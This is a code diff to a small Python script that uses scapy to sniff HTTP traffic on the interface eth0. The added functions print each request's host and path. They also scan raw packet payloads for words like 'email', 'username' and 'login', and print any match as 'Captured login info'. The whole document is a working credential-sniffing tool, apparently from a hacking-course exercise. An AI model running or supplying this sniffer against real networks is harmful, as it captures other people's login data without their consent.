@@ -8,10 +8,27 @@ def sniff(interface):
     scapy.sniff(iface=interface, store=False, prn=process_packet)
 
 
+def get_packet_url(packet):
+    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+
+
+def get_login_info(packet):
+    if packet.haslayer(scapy.Raw):
+        keywords = ["email", "username", "login", "user"]
+        for keyword in keywords:
+            if keyword in packet[scapy.Raw].load:
+                return packet[scapy.Raw].load
+
+
 def process_packet(packet):
     if packet.haslayer(http.HTTPRequest):
-        # if packet.haslayer(scapy.Raw):
-        print (packet.show())  # print (packet[scapy.Raw])
+        # display urls
+        print ("[+] HTTP Request >> " + get_packet_url(packet))
+
+        login_info = get_login_info(packet)
+        if login_info:
+            print ("Captured login info >> " + login_info)
+        # print (packet.show())
 
 
 sniff("eth0")
